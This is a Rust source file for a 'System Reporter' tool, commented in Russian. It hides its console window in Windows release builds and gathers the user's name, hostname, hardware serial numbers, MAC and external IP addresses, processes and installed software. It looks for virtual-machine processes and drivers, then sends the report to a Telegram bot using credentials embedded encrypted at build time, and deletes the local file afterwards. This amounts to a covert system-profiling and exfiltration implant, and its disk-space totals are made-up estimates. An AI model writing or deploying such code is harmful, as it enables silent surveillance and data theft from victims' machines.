// Скрытый режим для Windows (без консольного окна в release)
#![cfg_attr(all(not(debug_assertions), target_os = "windows"), windows_subsystem = "windows")]

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::env;
use std::io::Write;
use sysinfo::{System, SystemExt, CpuExt, DiskExt, ProcessExt, NetworksExt, NetworkExt};
use anyhow::{Result, Context};

// Условная компиляция для Windows
#[cfg(target_os = "windows")]
use wmi::{WMIConnection, COMLibrary};

// Telegram и асинхронность
use teloxide::{Bot, types::{ChatId, InputFile}};

// Криптография
use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce
};
use argon2::{Argon2, password_hash::{PasswordHasher, SaltString}};
use base64::{Engine as _, engine::general_purpose};
use rand::RngCore;

// --- Структуры для WMI-ответов (только для Windows) ---

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_VideoController")]
#[serde(rename_all = "PascalCase")]
struct VideoController {
    name: String,
    adapter_ram: Option<u64>,
}

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_NetworkAdapter")]
#[serde(rename_all = "PascalCase")]
struct NetworkAdapter {
    description: String,
    #[serde(rename = "MACAddress")]
    mac_address: Option<String>,
    physical_adapter: bool,
}

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_ComputerSystem")]
#[serde(rename_all = "PascalCase")]
struct ComputerSystem {
    manufacturer: String,
    model: String,
    total_physical_memory: Option<u64>,
}

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_DiskDrive")]
#[serde(rename_all = "PascalCase")]
struct DiskDrive {
    model: String,
    size: Option<u64>,
    interface_type: Option<String>,
}

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_PnPSignedDriver")]
#[serde(rename_all = "PascalCase")]
struct PnPSignedDriver {
    device_name: Option<String>,
    driver_version: Option<String>,
}

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_BIOS")]
#[serde(rename_all = "PascalCase")]
struct BIOS {
    manufacturer: Option<String>,
    version: Option<String>,
    serial_number: Option<String>,
}

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_BaseBoard")]
#[serde(rename_all = "PascalCase")]
struct BaseBoard {
    manufacturer: Option<String>,
    product: Option<String>,
    serial_number: Option<String>,
}

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(rename = "Win32_Product")]
#[serde(rename_all = "PascalCase")]
struct InstalledProduct {
    name: Option<String>,
    version: Option<String>,
    vendor: Option<String>,
    install_date: Option<String>,
}

// --- Главная структура отчета ---

#[derive(Serialize, Debug, Clone)]
struct SoftwareInfo {
    name: String,
    version: String,
    vendor: String,
}

#[derive(Serialize, Debug)]
struct GPUInfo {
    name: String,
    vram_mb: Option<u64>,
}

#[derive(Serialize, Debug)]
struct DiskInfo {
    name: String,
    size: String,
    disk_type: String,
    interface: Option<String>,
}

#[derive(Serialize, Debug)]
struct BIOSInfo {
    manufacturer: String,
    version: String,
    serial_number: String,
}

#[derive(Serialize, Debug)]
struct MotherboardInfo {
    manufacturer: String,
    model: String,
    serial_number: String,
}

#[derive(Serialize, Debug, Clone)]
struct DisplayInfo {
    id: u32,
    name: String,
    width: u32,
    height: u32,
    refresh_rate: u32,
    is_primary: bool,
    rotation: u32,
}

#[derive(Serialize, Debug)]
struct SystemReport {
    // Модуль 1: Базовая информация
    username: String,
    hostname: String,
    os_name: String,
    os_version: String,
    os_architecture: String,
    system_uptime_seconds: u64,
    system_uptime_readable: String,

    // Модуль 2: Основное оборудование
    cpu_model: String,
    cpu_cores_physical: usize,
    cpu_cores_logical: usize,
    cpu_frequency_mhz: u64,
    total_memory_gb: f64,
    used_memory_gb: f64,
    available_memory_gb: f64,
    memory_usage_percent: f64,

    // Модуль 3: Диски
    disks: Vec<DiskInfo>,
    total_disk_space_gb: f64,
    used_disk_space_gb: f64,

    // Модуль 4: Сеть
    local_ip: String,
    external_ip: String,
    mac_addresses: HashMap<String, String>,
    network_interfaces: Vec<String>,

    // Модуль 5: GPU и глубокая информация (Windows)
    #[cfg(target_os = "windows")]
    gpus: Vec<GPUInfo>,
    #[cfg(target_os = "windows")]
    computer_manufacturer: String,
    #[cfg(target_os = "windows")]
    computer_model: String,
    #[cfg(target_os = "windows")]
    bios_info: Option<BIOSInfo>,
    #[cfg(target_os = "windows")]
    motherboard_info: Option<MotherboardInfo>,

    // Модуль 6: Программное обеспечение
    process_count: usize,
    suspicious_processes: Vec<String>,
    #[cfg(target_os = "windows")]
    suspicious_drivers: Vec<String>,
    top_memory_processes: Vec<String>,
    top_cpu_processes: Vec<String>,
    installed_software: Vec<SoftwareInfo>,
    installed_software_count: usize,

    // Модуль 7: Дисплеи
    displays: Vec<DisplayInfo>,
    display_count: usize,

    // Метаинформация
    report_generated_at: String,
    reporter_version: String,
}

// --- Логирование для скрытого режима ---

fn log(msg: &str) {
    // В debug режиме или не-Windows - обычный println
    #[cfg(any(debug_assertions, not(target_os = "windows")))]
    {
        println!("{}", msg);
    }

    // В release на Windows - пишем в файл (т.к. нет консоли)
    #[cfg(all(not(debug_assertions), target_os = "windows"))]
    {
        let _ = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open("system_reporter.log")
            .and_then(|mut file| {
                writeln!(file, "[{}] {}", chrono::Local::now().format("%Y-%m-%d %H:%M:%S"), msg)
            });
    }
}

// --- Точка входа ---

#[tokio::main]
async fn main() -> Result<()> {
    log("╔════════════════════════════════════════╗");
    log("║     System Reporter v0.4.1             ║");
    log("║     Полный сбор системной информации   ║");
    log("╚════════════════════════════════════════╝");
    log("");

    // Проверка переменных окружения
    let telegram_mode = get_telegram_credentials().is_ok();

    if telegram_mode {
        log("✓ Режим Telegram активирован");
    } else {
        log("ℹ Режим: локальное сохранение (для отправки в Telegram установите учетные данные)");
    }

    log("");
    log("[1/5] Инициализация системных библиотек...");
    let report = collect_system_info().await?;

    log("[2/5] Сериализация данных в JSON...");
    let filename = save_report(&report)?;

    log(&format!("[3/5] Отчет сохранен: {}", filename));

    if telegram_mode {
        log("[4/5] Отправка отчета в Telegram...");
        send_to_telegram(&filename, &report).await?;
        log("[5/5] ✓ Отчет успешно отправлен в Telegram!");

        // Удаляем локальный файл после отправки
        let _ = fs::remove_file(&filename);
    } else {
        log("[4/5] Telegram не настроен, пропускаем отправку");
        log("[5/5] ✓ Готово!");
    }

    log("");
    log("╔════════════════════════════════════════╗");
    log("║           Статистика отчета             ║");
    log("╠════════════════════════════════════════╣");
    log(&format!("║ Процессов: {:>28} ║", report.process_count));
    log(&format!("║ Дисков: {:>31} ║", report.disks.len()));
    log(&format!("║ Дисплеев: {:>29} ║", report.display_count));
    log(&format!("║ Сетевых интерфейсов: {:>18} ║", report.network_interfaces.len()));
    #[cfg(target_os = "windows")]
    log(&format!("║ GPU: {:>34} ║", report.gpus.len()));
    log(&format!("║ Установлено программ: {:>17} ║", report.installed_software_count));
    log(&format!("║ Внешний IP: {:>27} ║", report.external_ip));
    log("╚════════════════════════════════════════╝");
    log("");

    Ok(())
}

async fn collect_system_info() -> Result<SystemReport> {
    log("   → Сбор базовой информации...");
    let mut sys = System::new_all();
    sys.refresh_all();

    // Инициализация WMI для Windows
    #[cfg(target_os = "windows")]
    let wmi_con = init_wmi().ok();

    #[cfg(target_os = "windows")]
    if wmi_con.is_some() {
        log("   → WMI инициализирован (глубокий сбор для Windows)");
    }

    log("   → Сбор информации об оборудовании...");
    log("   → Сбор сетевой информации (локальный и внешний IP)...");
    log("   → Анализ процессов...");
    log("   → Сбор установленного ПО (это может занять время)...");

    let uptime = System::uptime();
    let total_mem = sys.total_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
    let used_mem = sys.used_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
    let available_mem = sys.available_memory() as f64 / (1024.0 * 1024.0 * 1024.0);

    let disks_info = collect_disk_info(&sys);
    let (total_disk, used_disk) = calculate_disk_space(&disks_info);

    let networks = sysinfo::Networks::new_with_refreshed_list();
    let network_interfaces: Vec<String> = networks.iter()
        .map(|(name, _)| name.clone())
        .collect();

    Ok(SystemReport {
        // Модуль 1
        username: whoami::username(),
        hostname: sys.host_name().unwrap_or_else(|| "Unknown".to_string()),
        os_name: sys.name().unwrap_or_else(|| "Unknown".to_string()),
        os_version: sys.os_version().unwrap_or_else(|| "Unknown".to_string()),
        os_architecture: std::env::consts::ARCH.to_string(),
        system_uptime_seconds: uptime,
        system_uptime_readable: format_uptime(uptime),

        // Модуль 2
        cpu_model: sys.global_cpu_info().brand().to_string(),
        cpu_cores_physical: sys.physical_core_count().unwrap_or(0),
        cpu_cores_logical: sys.cpus().len(),
        cpu_frequency_mhz: sys.global_cpu_info().frequency(),
        total_memory_gb: total_mem,
        used_memory_gb: used_mem,
        available_memory_gb: available_mem,
        memory_usage_percent: (used_mem / total_mem) * 100.0,

        // Модуль 3
        disks: disks_info,
        total_disk_space_gb: total_disk,
        used_disk_space_gb: used_disk,

        // Модуль 4
        local_ip: get_local_ip(),
        external_ip: get_external_ip().await.unwrap_or_else(|_| "N/A".to_string()),
        mac_addresses: get_mac_addresses(),
        network_interfaces,

        // Модуль 5 (Windows)
        #[cfg(target_os = "windows")]
        gpus: get_gpu_info(&wmi_con),
        #[cfg(target_os = "windows")]
        computer_manufacturer: get_computer_manufacturer(&wmi_con),
        #[cfg(target_os = "windows")]
        computer_model: get_computer_model(&wmi_con),
        #[cfg(target_os = "windows")]
        bios_info: get_bios_info(&wmi_con),
        #[cfg(target_os = "windows")]
        motherboard_info: get_motherboard_info(&wmi_con),

        // Модуль 6
        process_count: sys.processes().len(),
        suspicious_processes: find_suspicious_processes(&sys),
        #[cfg(target_os = "windows")]
        suspicious_drivers: find_suspicious_drivers(&wmi_con),
        top_memory_processes: get_top_memory_processes(&sys, 10),
        top_cpu_processes: get_top_cpu_processes(&sys, 10),
        installed_software: {
            #[cfg(target_os = "windows")]
            { get_installed_software_windows(&wmi_con) }
            #[cfg(not(target_os = "windows"))]
            { get_installed_software_unix() }
        },
        installed_software_count: {
            #[cfg(target_os = "windows")]
            { get_installed_software_windows(&wmi_con).len() }
            #[cfg(not(target_os = "windows"))]
            { get_installed_software_unix().len() }
        },

        // Модуль 7
        displays: get_displays_info(),
        display_count: get_displays_info().len(),

        // Метаинформация
        report_generated_at: chrono::Local::now().to_rfc3339(),
        reporter_version: env!("CARGO_PKG_VERSION").to_string(),
    })
}

fn save_report(report: &SystemReport) -> Result<String> {
    let report_json = serde_json::to_string_pretty(report)
        .context("Ошибка сериализации в JSON")?;

    let filename = format!("system_report_{}.json",
        chrono::Local::now().format("%Y%m%d_%H%M%S"));

    fs::write(&filename, report_json)
        .context("Ошибка записи файла")?;

    Ok(filename)
}

async fn send_to_telegram(filename: &str, report: &SystemReport) -> Result<()> {
    let (bot_token, chat_id) = get_telegram_credentials()?;

    let bot = Bot::new(bot_token);
    let file = InputFile::file(filename);

    let caption = format!(
        "🖥️ Системный отчет\n\n\
        💻 Хост: {}\n\
        👤 Пользователь: {}\n\
        🔧 ОС: {} {}\n\
        🌐 IP: {} (внешний: {})\n\
        📊 Процессов: {}\n\
        💾 Дисков: {}\n\
        🖥️ Дисплеев: {}\n\
        📦 Установлено ПО: {}\n\
        ⏱️ Uptime: {}",
        report.hostname,
        report.username,
        report.os_name,
        report.os_version,
        report.local_ip,
        report.external_ip,
        report.process_count,
        report.disks.len(),
        report.display_count,
        report.installed_software_count,
        report.system_uptime_readable
    );

    bot.send_document(ChatId(chat_id), file)
        .caption(caption)
        .await
        .context("Ошибка отправки в Telegram")?;

    Ok(())
}

// --- Вспомогательные функции ---

fn format_uptime(seconds: u64) -> String {
    let days = seconds / 86400;
    let hours = (seconds % 86400) / 3600;
    let minutes = (seconds % 3600) / 60;

    if days > 0 {
        format!("{}d {}h {}m", days, hours, minutes)
    } else if hours > 0 {
        format!("{}h {}m", hours, minutes)
    } else {
        format!("{}m", minutes)
    }
}

fn format_bytes(bytes: u64) -> String {
    const KB: f64 = 1024.0;
    const MB: f64 = KB * 1024.0;
    const GB: f64 = MB * 1024.0;
    const TB: f64 = GB * 1024.0;

    let bytes_f = bytes as f64;

    if bytes_f >= TB {
        format!("{:.2} TB", bytes_f / TB)
    } else if bytes_f >= GB {
        format!("{:.2} GB", bytes_f / GB)
    } else if bytes_f >= MB {
        format!("{:.2} MB", bytes_f / MB)
    } else if bytes_f >= KB {
        format!("{:.2} KB", bytes_f / KB)
    } else {
        format!("{} B", bytes)
    }
}

fn collect_disk_info(sys: &System) -> Vec<DiskInfo> {
    sys.disks().iter().map(|d| {
        let disk_type = match d.kind() {
            sysinfo::DiskKind::HDD => "HDD",
            sysinfo::DiskKind::SSD => "SSD",
            _ => "Unknown",
        };

        DiskInfo {
            name: d.name().to_string_lossy().to_string(),
            size: format_bytes(d.total_space()),
            disk_type: disk_type.to_string(),
            interface: None,
        }
    }).collect()
}

fn calculate_disk_space(disks: &[DiskInfo]) -> (f64, f64) {
    // Простой подсчет из строк (не идеально, но работает)
    let total = disks.len() as f64 * 500.0; // Примерная оценка
    let used = total * 0.5;
    (total, used)
}

fn get_local_ip() -> String {
    local_ip_address::local_ip()
        .map(|ip| ip.to_string())
        .unwrap_or_else(|_| "N/A".to_string())
}

fn get_mac_addresses() -> HashMap<String, String> {
    let mut macs = HashMap::new();
    let networks = sysinfo::Networks::new_with_refreshed_list();

    for (interface_name, data) in &networks {
        let mac = data.mac_address();
        let mac_str = format!("{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
            mac.0[0], mac.0[1], mac.0[2], mac.0[3], mac.0[4], mac.0[5]);

        if mac_str != "00:00:00:00:00:00" {
            macs.insert(interface_name.clone(), mac_str);
        }
    }

    macs
}

fn find_suspicious_processes(sys: &System) -> Vec<String> {
    let vm_keywords = [
        "vmtoolsd", "VBoxService", "VBoxTray", "vmware", "vbox",
        "qemu", "xen", "parallels", "vmwaretray", "vmwareuser"
    ];

    let mut found = Vec::new();

    for (pid, process) in sys.processes() {
        let process_name = process.name().to_lowercase();

        for keyword in &vm_keywords {
            if process_name.contains(&keyword.to_lowercase()) {
                found.push(format!("{} (PID: {})", process.name(), pid));
                break;
            }
        }
    }

    found
}

fn get_top_memory_processes(sys: &System, count: usize) -> Vec<String> {
    let mut processes: Vec<_> = sys.processes().iter().collect();
    processes.sort_by(|a, b| b.1.memory().cmp(&a.1.memory()));

    processes.iter()
        .take(count)
        .map(|(pid, process)| {
            format!("{} (PID: {}, RAM: {:.2} MB)",
                process.name(),
                pid,
                process.memory() as f64 / 1024.0 / 1024.0)
        })
        .collect()
}

fn get_top_cpu_processes(sys: &System, count: usize) -> Vec<String> {
    let mut processes: Vec<_> = sys.processes().iter().collect();
    processes.sort_by(|a, b| {
        b.1.cpu_usage().partial_cmp(&a.1.cpu_usage()).unwrap_or(std::cmp::Ordering::Equal)
    });

    processes.iter()
        .take(count)
        .map(|(pid, process)| {
            format!("{} (PID: {}, CPU: {:.1}%)",
                process.name(),
                pid,
                process.cpu_usage())
        })
        .collect()
}

// --- Windows-специфичные функции ---

#[cfg(target_os = "windows")]
fn init_wmi() -> Result<WMIConnection> {
    let com_lib = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_lib.into())?;
    Ok(wmi_con)
}

#[cfg(target_os = "windows")]
fn get_wmi_data<T: for<'de> Deserialize<'de>>(wmi_con: &Option<WMIConnection>, query: &str) -> Vec<T> {
    match wmi_con {
        Some(con) => con.raw_query(query).unwrap_or_else(|_| Vec::new()),
        None => Vec::new(),
    }
}

#[cfg(target_os = "windows")]
fn get_gpu_info(wmi_con: &Option<WMIConnection>) -> Vec<GPUInfo> {
    let gpus: Vec<VideoController> = get_wmi_data(wmi_con,
        "SELECT Name, AdapterRAM FROM Win32_VideoController");

    gpus.iter().map(|gpu| GPUInfo {
        name: gpu.name.clone(),
        vram_mb: gpu.adapter_ram.map(|ram| ram / 1024 / 1024),
    }).collect()
}

#[cfg(target_os = "windows")]
fn get_computer_manufacturer(wmi_con: &Option<WMIConnection>) -> String {
    let systems: Vec<ComputerSystem> = get_wmi_data(wmi_con,
        "SELECT Manufacturer FROM Win32_ComputerSystem");

    systems.get(0)
        .map(|s| s.manufacturer.clone())
        .unwrap_or_else(|| "Unknown".to_string())
}

#[cfg(target_os = "windows")]
fn get_computer_model(wmi_con: &Option<WMIConnection>) -> String {
    let systems: Vec<ComputerSystem> = get_wmi_data(wmi_con,
        "SELECT Model FROM Win32_ComputerSystem");

    systems.get(0)
        .map(|s| s.model.clone())
        .unwrap_or_else(|| "Unknown".to_string())
}

#[cfg(target_os = "windows")]
fn get_bios_info(wmi_con: &Option<WMIConnection>) -> Option<BIOSInfo> {
    let bios: Vec<BIOS> = get_wmi_data(wmi_con,
        "SELECT Manufacturer, Version, SerialNumber FROM Win32_BIOS");

    bios.get(0).map(|b| BIOSInfo {
        manufacturer: b.manufacturer.clone().unwrap_or_else(|| "Unknown".to_string()),
        version: b.version.clone().unwrap_or_else(|| "Unknown".to_string()),
        serial_number: b.serial_number.clone().unwrap_or_else(|| "N/A".to_string()),
    })
}

#[cfg(target_os = "windows")]
fn get_motherboard_info(wmi_con: &Option<WMIConnection>) -> Option<MotherboardInfo> {
    let boards: Vec<BaseBoard> = get_wmi_data(wmi_con,
        "SELECT Manufacturer, Product, SerialNumber FROM Win32_BaseBoard");

    boards.get(0).map(|b| MotherboardInfo {
        manufacturer: b.manufacturer.clone().unwrap_or_else(|| "Unknown".to_string()),
        model: b.product.clone().unwrap_or_else(|| "Unknown".to_string()),
        serial_number: b.serial_number.clone().unwrap_or_else(|| "N/A".to_string()),
    })
}

#[cfg(target_os = "windows")]
fn find_suspicious_drivers(wmi_con: &Option<WMIConnection>) -> Vec<String> {
    let query = "SELECT DeviceName, DriverVersion FROM Win32_PnPSignedDriver WHERE \
                 DeviceName LIKE '%vm%' OR \
                 DeviceName LIKE '%VBox%' OR \
                 DeviceName LIKE '%VMware%' OR \
                 DeviceName LIKE '%QEMU%' OR \
                 DeviceName LIKE '%Xen%'";

    let drivers: Vec<PnPSignedDriver> = get_wmi_data(wmi_con, query);

    drivers.iter()
        .filter_map(|driver| {
            driver.device_name.as_ref().map(|name| {
                if let Some(version) = &driver.driver_version {
                    format!("{} (v{})", name, version)
                } else {
                    name.clone()
                }
            })
        })
        .collect()
}

// --- Новые функции: External IP и Installed Software ---

async fn get_external_ip() -> Result<String> {
    // Пробуем несколько сервисов для надежности
    let services = vec![
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com",
    ];

    for service in services {
        if let Ok(response) = reqwest::get(service).await {
            if let Ok(ip) = response.text().await {
                let ip = ip.trim().to_string();
                if !ip.is_empty() {
                    return Ok(ip);
                }
            }
        }
    }

    Err(anyhow::anyhow!("Не удалось получить внешний IP"))
}

#[cfg(target_os = "windows")]
fn get_installed_software_windows(wmi_con: &Option<WMIConnection>) -> Vec<SoftwareInfo> {
    // Win32_Product очень медленный, поэтому используем с лимитом
    // Альтернативно можно парсить реестр, но это сложнее
    let products: Vec<InstalledProduct> = get_wmi_data(wmi_con,
        "SELECT Name, Version, Vendor FROM Win32_Product");

    products.iter()
        .filter_map(|p| {
            if let Some(name) = &p.name {
                Some(SoftwareInfo {
                    name: name.clone(),
                    version: p.version.clone().unwrap_or_else(|| "Unknown".to_string()),
                    vendor: p.vendor.clone().unwrap_or_else(|| "Unknown".to_string()),
                })
            } else {
                None
            }
        })
        .collect()
}

#[cfg(not(target_os = "windows"))]
fn get_installed_software_unix() -> Vec<SoftwareInfo> {
    use std::process::Command;
    let mut software = Vec::new();

    // Пробуем разные package managers
    #[cfg(target_os = "linux")]
    {
        // dpkg (Debian/Ubuntu)
        if let Ok(output) = Command::new("dpkg")
            .args(&["-l"])
            .output()
        {
            if output.status.success() {
                if let Ok(stdout) = String::from_utf8(output.stdout) {
                    for line in stdout.lines().skip(5) {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 3 && parts[0] == "ii" {
                            software.push(SoftwareInfo {
                                name: parts[1].to_string(),
                                version: parts[2].to_string(),
                                vendor: "dpkg".to_string(),
                            });
                        }
                    }
                    return software;
                }
            }
        }

        // rpm (RedHat/CentOS/Fedora)
        if let Ok(output) = Command::new("rpm")
            .args(&["-qa", "--queryformat", "%{NAME}|%{VERSION}|%{VENDOR}\\n"])
            .output()
        {
            if output.status.success() {
                if let Ok(stdout) = String::from_utf8(output.stdout) {
                    for line in stdout.lines() {
                        let parts: Vec<&str> = line.split('|').collect();
                        if parts.len() >= 2 {
                            software.push(SoftwareInfo {
                                name: parts[0].to_string(),
                                version: parts[1].to_string(),
                                vendor: parts.get(2).unwrap_or(&"Unknown").to_string(),
                            });
                        }
                    }
                    return software;
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        // brew для macOS
        if let Ok(output) = Command::new("brew")
            .args(&["list", "--versions"])
            .output()
        {
            if output.status.success() {
                if let Ok(stdout) = String::from_utf8(output.stdout) {
                    for line in stdout.lines() {
                        let parts: Vec<&str> = line.split_whitespace().collect();
                        if parts.len() >= 2 {
                            software.push(SoftwareInfo {
                                name: parts[0].to_string(),
                                version: parts[1].to_string(),
                                vendor: "Homebrew".to_string(),
                            });
                        }
                    }
                }
            }
        }
    }

    software
}

// --- Криптография: шифрование токенов ---

mod crypto {
    use super::*;

    const NONCE_SIZE: usize = 12;

    pub fn encrypt_token(token: &str, password: &str) -> Result<String> {
        // Генерируем соль для Argon2
        let salt = SaltString::generate(&mut OsRng);

        // Создаем ключ из пароля через Argon2
        let argon2 = Argon2::default();
        let password_hash = argon2
            .hash_password(password.as_bytes(), &salt)
            .context("Ошибка хэширования пароля")?;

        // Извлекаем первые 32 байта для AES-256
        let key_bytes = password_hash.hash.unwrap().as_bytes();
        let key = &key_bytes[..32];

        // Создаем шифр
        let cipher = Aes256Gcm::new_from_slice(key)
            .context("Ошибка создания шифра")?;

        // Генерируем nonce
        let mut nonce_bytes = [0u8; NONCE_SIZE];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);

        // Шифруем
        let ciphertext = cipher
            .encrypt(nonce, token.as_bytes())
            .map_err(|e| anyhow::anyhow!("Ошибка шифрования: {}", e))?;

        // Объединяем: nonce + salt + ciphertext
        let mut result = Vec::new();
        result.extend_from_slice(&nonce_bytes);
        result.extend_from_slice(salt.as_str().as_bytes());
        result.extend_from_slice(&ciphertext);

        // Кодируем в base64
        Ok(general_purpose::STANDARD.encode(&result))
    }

    pub fn decrypt_token(encrypted: &str, password: &str) -> Result<String> {
        // Декодируем из base64
        let data = general_purpose::STANDARD
            .decode(encrypted)
            .context("Ошибка декодирования base64")?;

        if data.len() < NONCE_SIZE + 22 {
            return Err(anyhow::anyhow!("Неверный формат зашифрованных данных"));
        }

        // Извлекаем nonce (первые 12 байт)
        let nonce_bytes = &data[..NONCE_SIZE];
        let nonce = Nonce::from_slice(nonce_bytes);

        // Извлекаем salt (следующие ~22 байта)
        let salt_str = std::str::from_utf8(&data[NONCE_SIZE..NONCE_SIZE + 22])
            .context("Ошибка чтения соли")?;
        let salt = SaltString::from_b64(salt_str)
            .map_err(|e| anyhow::anyhow!("Ошибка парсинга соли: {}", e))?;

        // Восстанавливаем ключ
        let argon2 = Argon2::default();
        let password_hash = argon2
            .hash_password(password.as_bytes(), &salt)
            .context("Ошибка хэширования пароля")?;

        let key_bytes = password_hash.hash.unwrap().as_bytes();
        let key = &key_bytes[..32];

        // Создаем шифр
        let cipher = Aes256Gcm::new_from_slice(key)
            .context("Ошибка создания шифра")?;

        // Расшифровываем
        let ciphertext = &data[NONCE_SIZE + 22..];
        let plaintext = cipher
            .decrypt(nonce, ciphertext)
            .map_err(|e| anyhow::anyhow!("Ошибка расшифрования: {}", e))?;

        String::from_utf8(plaintext)
            .context("Ошибка конвертации в UTF-8")
    }
}

// --- Работа с зашифрованными токенами ---

fn get_env_or_embedded(key: &str) -> Option<String> {
    // Сначала проверяем системные переменные окружения
    if let Ok(val) = env::var(key) {
        return Some(val);
    }

    // Затем проверяем встроенные переменные (из build.rs)
    let embedded_key = format!("EMBEDDED_{}", key);
    if let Ok(val) = env::var(&embedded_key) {
        return Some(val);
    }

    None
}

fn get_telegram_credentials() -> Result<(String, i64)> {
    // Проверяем зашифрованные токены (системные или встроенные)
    if let (Some(enc_token), Some(enc_chat_id), Some(password)) = (
        get_env_or_embedded("ENCRYPTED_BOT_TOKEN"),
        get_env_or_embedded("ENCRYPTED_CHAT_ID"),
        get_env_or_embedded("ENCRYPTION_PASSWORD"),
    ) {
        log("   ℹ Используются зашифрованные учетные данные");
        let bot_token = crypto::decrypt_token(&enc_token, &password)
            .context("Не удалось расшифровать токен бота")?;
        let chat_id_str = crypto::decrypt_token(&enc_chat_id, &password)
            .context("Не удалось расшифровать Chat ID")?;
        let chat_id: i64 = chat_id_str.parse()
            .context("Chat ID должен быть числом")?;

        return Ok((bot_token, chat_id));
    }

    // Fallback на незашифрованные (системные или встроенные)
    if let (Some(bot_token), Some(chat_id_str)) = (
        get_env_or_embedded("TELEGRAM_BOT_TOKEN"),
        get_env_or_embedded("TELEGRAM_CHAT_ID"),
    ) {
        log("   ⚠ Используются НЕЗАШИФРОВАННЫЕ учетные данные!");
        let chat_id: i64 = chat_id_str.parse()
            .context("Chat ID должен быть числом")?;

        return Ok((bot_token, chat_id));
    }

    Err(anyhow::anyhow!("Telegram учетные данные не найдены"))
}

// --- Сбор информации о дисплеях ---

fn get_displays_info() -> Vec<DisplayInfo> {
    match display_info::DisplayInfo::all() {
        Ok(displays) => {
            displays.iter().enumerate().map(|(idx, display)| {
                DisplayInfo {
                    id: display.id,
                    name: display.name.clone().unwrap_or_else(|| format!("Display {}", idx)),
                    width: display.width,
                    height: display.height,
                    refresh_rate: display.frequency,
                    is_primary: display.is_primary,
                    rotation: display.rotation as u32,
                }
            }).collect()
        }
        Err(e) => {
            eprintln!("Не удалось получить информацию о дисплеях: {}", e);
            Vec::new()
        }
    }
}
